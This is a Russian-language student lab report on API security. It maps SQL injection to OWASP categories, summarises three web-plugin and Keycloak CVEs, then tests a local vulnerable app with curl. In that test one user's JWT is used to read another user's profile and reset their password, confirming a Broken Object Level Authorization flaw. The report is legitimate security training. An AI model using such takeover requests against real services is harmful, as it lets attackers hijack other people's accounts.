### OWASP Top 10

В OWASP Top 10:2021 SQL Injection относится к категории **A03:2021 — Injection**. В эту категорию также входят другие уязвимости, связанные с передачей непроверенных данных в интерпретатор команд или запросов. OWASP указывает среди notable CWE:

- CWE-79: Cross-site Scripting;
- CWE-89: SQL Injection;
- CWE-73: External Control of File Name or Path.

Таким образом, SQL Injection является частным случаем более широкой категории Injection.

## 1.4. Примеры актуальных уязвимостей из NVD

Дополнительно были рассмотрены реальные CVE, связанные с веб-приложениями и API.

### CVE-2025-9209 — RestroPress: Authentication Bypass через REST API

Источник:  
https://nvd.nist.gov/vuln/detail/CVE-2025-9209

В плагине RestroPress для WordPress версии 3.0.0–3.1.9.2 через endpoint `/wp-json/wp/v2/users` раскрывались private tokens и API data. Из-за этого неаутентифицированный атакующий мог подделать JWT-токены других пользователей, включая администратора, и войти от их имени.

Категория OWASP:  
**API2:2023 — Broken Authentication**

Недостаток заключается в том, что REST API возвращал данные, которые нельзя отдавать клиенту: приватные токены пользователя. Получив такой токен, атакующий мог сформировать валидный JWT и авторизоваться как другой пользователь.

Причина недостатка: небезопасная реализация аутентификации и экспонирование чувствительных данных через API.

---

### CVE-2025-12030 — ACF to REST API: IDOR / Broken Object-Level Authorization

Источник:  
https://nvd.nist.gov/vuln/detail/CVE-2025-12030

В плагине ACF to REST API до версии 3.3.4 была уязвимость Insecure Direct Object Reference. В методе `update_item_permissions_check()` проверялось только общее право `edit_posts`, но не проверялись объектные права вроде `edit_post($id)`, `edit_user($id)` или `manage_options`.

Категория OWASP:  
**API1:2023 — Broken Object Level Authorization**

Недостаток заключается в том, что пользователь с низкими правами мог обращаться к endpoint’ам вида `/wp-json/acf/v3/{type}/{id}` и изменять чужие сущности: посты, пользователей, комментарии, термы и глобальные настройки.

Причина недостатка: недостаточная проверка авторизации на уровне конкретного объекта. Сервер проверял только общее наличие роли или capability, но не проверял, имеет ли пользователь право менять именно этот объект.

---

### CVE-2025-14082 — Keycloak Admin REST API: Information Disclosure

Источник:  
https://nvd.nist.gov/vuln/detail/CVE-2025-14082

В Keycloak Admin REST API через endpoint `/admin/realms/{realm}/roles` было возможно раскрытие чувствительных метаданных ролей из-за insufficient authorization checks. В NVD для уязвимости указан CWE-284 Improper Access Control.

Категория OWASP:  
**API5:2023 — Broken Function Level Authorization**

Недостаток заключается в том, что даже при ограниченном доступе endpoint административного REST API позволял получить метаданные ролей realm’а, которые не должны были быть доступны пользователю с таким уровнем прав.

Причина недостатка: некорректная серверная проверка прав для административной функции API.

# Часть 2. Практика

2.1. Что я решил проверитьПосле запуска приложения я сначала решил просто посмотреть, какие ручки вообще есть и как они работают. По смыслу было понятно, что в приложении есть пользователи, регистрация, логин, просмотр профиля и какие-то операции изменения данных.Я решил проверить уязвимость, связанную с авторизацией: может ли один пользователь получить доступ к данным другого пользователя или изменить их.Гипотеза была такая: сервер может проверять, что токен валидный, но не проверять, имеет ли пользователь право работать именно с тем объектом, который указан в URL.Такая проблема относится к **OWASP API1:2023 — Broken Object Level Authorization**.Проще говоря: если я вошёл как `varkes`, я не должен иметь возможность менять данные пользователя `bebris`.---## 2.2. Первичная проверка ручекСначала я проверял запросы через консоль браузера, потому что так было быстрее понять, что вообще принимает приложение.Попробовал зарегистрировать пользователя:
```js
fetch('/users/v1/register', {  method: 'POST',  headers: {    'Content-Type': 'application/json'  },  body: JSON.stringify({    username: 'testuser',    password: '123456',    email: 'test@example.com'  })}).then(r => r.json()).then(console.log).catch(console.error);

```
Пользователь успешно зарегистрировался, поэтому дальше я попробовал залогиниться:

```js
fetch('/users/v1/login', {  method: 'POST',  headers: {    'Content-Type': 'application/json'  },  body: JSON.stringify({    username: 'testuser',    password: '123456'  })}).then(r => r.json()).then(console.log).catch(console.error);
```

В ответ сервер вернул токен:

```
{  "auth_token": "JWT_TOKEN",  "message": "Successfully logged in.",  "status": "success"}
```

После этого стало понятно, что приложение использует JWT. То есть для дальнейших запросов нужно передавать токен в заголовке:

```
Authorization: Bearer <token>
```

Потом я перешёл на `curl`, потому что через него удобнее сохранять все запросы и ответы для отчёта.

## 2.3. Создание тестовых пользователей

Чтобы нормально проверить доступы, я создал двух пользователей:

- `varkes`;
- `bebris`.

Идея была простая: зайти под `varkes`, а потом попробовать получить или изменить данные `bebris`.

Сначала задал базовый адрес:

```
BASE="http://localhost:8080"
```

Зарегистрировал `varkes`:

```
curl -s -X POST "$BASE/users/v1/register" \  -H "Content-Type: application/json" \  -d '{"username":"varkes","password":"varkes123","email":"varkes@example.com"}'
```

Потом зарегистрировал `bebris`:

```
curl -s -X POST "$BASE/users/v1/register" \  -H "Content-Type: application/json" \  -d '{"username":"bebris","password":"bebris123","email":"bebris@example.com"}'
```

Оба пользователя создались без ошибок.

## 2.4. Логин под varkes

Дальше я залогинился под пользователем `varkes`:

```
curl -s -X POST "$BASE/users/v1/login" \  -H "Content-Type: application/json" \  -d '{"username":"varkes","password":"varkes123"}'
```

В ответ получил JWT-токен:

```
{  "auth_token": "JWT_TOKEN_varkes",  "message": "Successfully logged in.",  "status": "success"}
```

Я сохранил его в переменную:

```
TOKEN="JWT_TOKEN_varkes"
```

Для начала проверил, что токен вообще рабочий:

```
curl -i -s "$BASE/users/v1/varkes" \  -H "Authorization: Bearer $TOKEN"
```

Сервер вернул профиль `varkes`, значит токен подходит и можно продолжать.

## 2.5. Пробую получить профиль bebris с токеном varkes

Следующий шаг — проверить, могу ли я под токеном `varkes` получить данные пользователя `bebris`.

```
curl -i -s "$BASE/users/v1/bebris" \  -H "Authorization: Bearer $TOKEN"
```

Ответ сервера:

```
HTTP/1.0 200 OKContent-Type: application/jsonContent-Length: 47Server: Werkzeug/1.0.1 Python/3.7.12{"username": "bebris", "email": "bebris@example.com"}
```

Тут уже видно подозрительное поведение: я авторизован как `varkes`, но спокойно получаю email пользователя `bebris`.

Пока это ещё не самая критичная проблема, но это уже намекает, что сервер не очень строго проверяет доступ к конкретному пользователю.

## 2.13. Что именно подтвердилось

Главный проблемный запрос:

```
curl -i -s -X PUT "$BASE/users/v1/bebris/password" \  -H "Content-Type: application/json" \  -H "Authorization: Bearer $TOKEN" \  -d '{"password":"newbebris123"}'
```

В этом запросе:

- токен принадлежал пользователю `varkes`;
- в URL был указан пользователь `bebris`;
- менялся пароль пользователя `bebris`.

Сервер должен был проверить, что `varkes` не имеет права менять пароль `bebris`. Но этого не произошло.

Ожидаемая логика должна быть такой:

```
Пользователь из токена: varkesПользователь в URL: bebrisvarkes != bebrisvarkes не администраторЗначит, запрос надо отклонить.
```

Ожидаемый ответ:

```
HTTP/1.1 403 Forbidden
```

Фактический результат:

```
Сервер принял запрос и изменил пароль пользователя bebris.
```

## 2.14. Почему это уязвимость

Проблема в том, что сервер проверяет только сам факт авторизации.

То есть он проверяет:

```
Есть ли валидный токен?
```

Но не проверяет:

```
Имеет ли этот пользователь право менять именно этот аккаунт?
```

Из-за этого любой авторизованный пользователь может обратиться к endpoint’у другого пользователя и выполнить действие, которое должно быть запрещено.

В моём случае `varkes` смогла поменять пароль `bebris`.

Это и есть **Broken Object Level Authorization**: нет нормальной проверки прав доступа на уровне конкретного объекта.

## Вывод

В ходе проверки я подтвердил уязвимость **OWASP API1:2023 — Broken Object Level Authorization**.

Сценарий получился такой:


1. Я создал пользователей varkes и bebris.
2. Залогинился под varkes и получил JWT.
3. С токеном varkes обратился к данным bebris.
4. Потом с тем же токеном varkes отправил запрос на смену пароля bebris.
5. Сервер принял запрос.
6. После этого bebris смог войти с новым паролем.
7. Старый пароль bebris перестал работать.


То есть приложение проверяет, что пользователь авторизован, но не проверяет, имеет ли он право менять именно этот аккаунт.

Основная проблема: отсутствие объектной проверки доступа. Пользователь должен иметь возможность менять только свой аккаунт, а изменение чужих аккаунтов должно быть доступно только администратору.
